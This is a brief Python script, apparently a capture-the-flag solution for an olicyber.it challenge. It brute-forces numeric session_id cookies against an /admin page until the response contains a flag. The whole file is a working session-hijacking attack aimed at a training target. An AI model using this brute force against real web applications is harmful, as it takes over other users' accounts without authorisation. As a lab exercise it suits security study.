import sys
import requests
import re

for x in range(0, 10000):
    # print(f"tentativo con session_id = {x}")
    admin_url = 'http://too-small-reminder.challs.olicyber.it/admin'
    admin_response = requests.get(admin_url, cookies={'session_id': str(x)})
    if 'flag' in admin_response.text:
        flag = re.findall(r'flag\{.*?}', admin_response.text)
        if flag:
            print(flag[0])
        sys.exit()

